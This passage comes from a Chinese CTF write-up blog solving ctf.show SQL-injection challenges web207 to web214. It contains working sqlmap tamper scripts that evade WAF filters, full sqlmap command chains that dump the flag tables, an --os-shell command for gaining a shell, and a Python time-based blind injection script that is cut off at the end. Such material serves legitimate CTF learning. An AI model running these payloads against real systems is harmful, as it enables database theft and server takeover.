分割sql关键字</td></tr><tr><td>charunicodeencode.py</td><td>字符串unicode编码</td></tr><tr><td>securesphere.py</td><td>追加特制的字符串</td></tr><tr><td>versionedmorekeywords.py</td><td>注释绕过</td></tr><tr><td>space2comment.py</td><td>Replaces space character <code>&#39; &#39;</code> with comments <code>/**/</code></td></tr></tbody></table><p>我们来试一下哦 web207.py 大概意思就是把空格用 0x0a代替也就是回车</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload,**kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote , firstspace = <span class="literal">False</span>, <span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>  retVal</span><br></pre></td></tr></table></figure><p>我们挂一下代理看看是怎么改的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --proxy=&quot;http://127.0.0.1:8080&quot;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210406203.png" alt="image-20220407210406203"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://6cb6bdef-c812-4cfe-aca7-03c24ef0d0ae.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web207 --batch -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span><br></pre></td></tr></table></figure><h1 id="web208"><a href="#web208" class="headerlink" title="web208"></a>web208</h1><h2 id="小括号闭合-大小写"><a href="#小括号闭合-大小写" class="headerlink" title="小括号闭合,大小写"></a>小括号闭合,大小写</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407210921431.png" alt="image-20220407210921431"></p><p>这时你就需要–prefix和–suffix参数了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch --dbs </span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u &quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/index.php&quot; --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://5641ec05-7308-4a20-94df-ff748404524d.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --prefix=&quot;&#x27;)&quot; --tamper=&quot;space2comment,randomcase&quot; --batch -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span><br></pre></td></tr></table></figure><h1 id="web209"><a href="#web209" class="headerlink" title="web209"></a>web209</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407215132018.png" alt="image-20220407215132018"></p><h2 id="过滤-等号和空格"><a href="#过滤-等号和空格" class="headerlink" title="过滤* 等号和空格"></a>过滤* 等号和空格</h2><p>web209.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload , **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote , doublequote , firstspace = <span class="literal">False</span> ,<span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += (<span class="built_in">chr</span>(<span class="number">0x0a</span>)) <span class="comment">#return</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] ==<span class="string">&quot;\&#x27;&quot;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)<span class="comment">#1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 --dbs </span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D ctfshow_web --tables</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav --columns</span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://4f3acfe3-bc6e-460e-93a3-478fce4abd78.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web209 -D  ctfshow_web -T  ctfshow_flav -C ctfshow_flagx --dump</span><br></pre></td></tr></table></figure><h1 id="web210"><a href="#web210" class="headerlink" title="web210"></a>web210</h1><h2 id="base64解密"><a href="#base64解密" class="headerlink" title="base64解密"></a>base64解密</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407214810805.png" alt="image-20220407214810805"></p><p>web210.py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    payload = space2comment(payload)</span><br><span class="line">    retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = base64.b64encode(payload[::-<span class="number">1</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)) <span class="comment">#翻转字符串以utf-8便码成二进制</span></span><br><span class="line">        retVal = base64.b64encode(retVal[::-<span class="number">1</span>]).decode(<span class="string">&#x27;utf-8&#x27;</span>)<span class="comment">#解码成utf-8</span></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">space2comment</span>(<span class="params">payload</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote , firstspqce = <span class="literal">False</span> ,<span class="literal">False</span> ,<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspqce:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspqce = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;\&#x27;&quot;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;*&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x31</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot;=&quot;</span>:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>) + <span class="string">&#x27;like&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span><span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="built_in">chr</span>(<span class="number">0x0a</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            retVal += payload[i]</span><br><span class="line">        <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://27df2ca5-41a5-454c-b26b-83fc12edff4a.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavi -C ctfshow_flagxx --dump </span><br></pre></td></tr></table></figure><h1 id="web211"><a href="#web211" class="headerlink" title="web211"></a>web211</h1><h2 id="base64解密翻转字符过滤空格"><a href="#base64解密翻转字符过滤空格" class="headerlink" title="base64解密翻转字符过滤空格"></a>base64解密翻转字符过滤空格</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221144978.png" alt="image-20220407221144978"></p><p>210脚本</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://974f3919-1928-425e-a9d0-942297f1c8e8.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavia -C ctfshow_flagxxa --dump </span><br></pre></td></tr></table></figure><h1 id="web212"><a href="#web212" class="headerlink" title="web212"></a>web212</h1><h2 id="base64解密翻转字符过滤空格-1"><a href="#base64解密翻转字符过滤空格-1" class="headerlink" title="base64解密翻转字符过滤空格 *"></a>base64解密翻转字符过滤空格 *</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407221504134.png" alt="image-20220407221504134"></p><p><a href="http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/">http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注入点</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210</span><br><span class="line">数据库</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --dbs</span><br><span class="line">表名</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 --tables -D  ctfshow_web</span><br><span class="line">字段名</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis --columns </span><br><span class="line">数据</span><br><span class="line">python sqlmap.py -u http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://2060b640-0f90-4916-8d78-7048d5d40413.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --batch --tamper=web210 -D ctfshow_web -T  ctfshow_flavis -C ctfshow_flagxsa --dump </span><br></pre></td></tr></table></figure><h1 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h1><h2 id="使用–os-shell-一键getshell"><a href="#使用–os-shell-一键getshell" class="headerlink" title="使用–os-shell 一键getshell"></a>使用–os-shell 一键getshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/index.php --method=PUT --data=&quot;id=1&quot; --referer=ctf.show --headers=&quot;Content-Type: text/plain&quot; --safe-url=&quot;http://45646f72-e298-4956-87c9-62cea287a473.challenge.ctf.show/api/getToken.php&quot; --safe-freq=1 --tamper=web210 --dump  --os-shell --batch</span><br></pre></td></tr></table></figure><p>这里还没写完,但是已经写的差不多了</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222705713.png" alt="image-20220407222705713"></p><p>发现是一个上传文件页面</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407222740808.png" alt="image-20220407222740808"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223832502.png" alt="image-20220407223832502"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223908157.png" alt="image-20220407223908157"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220407223941771.png" alt="image-20220407223941771"></p><h1 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h1><p>没找到参数在哪,翻翻源码看看</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110118163.png" alt="image-20220408110118163"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110151699.png" alt="image-20220408110151699"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220408110311009.png" alt="image-20220408110311009"></p><p>我们看看这个select.js的写法,发现向api&#x2F;post了ip和debug两个参数</p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>判断</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://74b615cd-aac0-4c4a-889f-84aa544d2a96.challenge.ctf.show/api/&quot;</span></span><br><span class="line">payload = <span class="string">&quot;length(database())=0&quot;</span> <span class="comment">#没延迟</span></span><br><span class="line"><span class="comment">#payload = &quot;length(database())&gt;0&quot; #延迟</span></span><br><span class="line">date = &#123;</span><br><span class="line">    <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;if((<span class="subst">&#123;payload&#125;</span>),sleep(2),1)&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;debug&#x27;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.post(url, data=date, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没延迟&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;延迟&#x27;</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://d23ee9e9-3e43-4b0a-b172-547561ea456d.chall.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">       